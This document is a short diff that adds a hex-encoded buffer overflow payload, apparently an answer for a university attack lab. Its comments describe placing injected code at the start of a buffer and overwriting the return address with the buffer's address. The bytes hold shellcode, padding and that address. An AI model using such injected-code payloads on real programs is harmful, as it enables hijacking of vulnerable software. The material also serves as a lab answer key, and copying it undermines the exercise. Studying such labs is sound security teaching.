@@ -1,0 +1,11 @@
+/* change the primitive return address to the initial address of attack address */
+/* we put the attack code at the beginnig of buf */
+/* address of buf : 0x556838f8 */
+c7 05 18 c2 04 08 
+6a b6 bd 73 68 05 8d 04 08 
+c3 
+00 00 00 00
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00
+f8 38 68 55
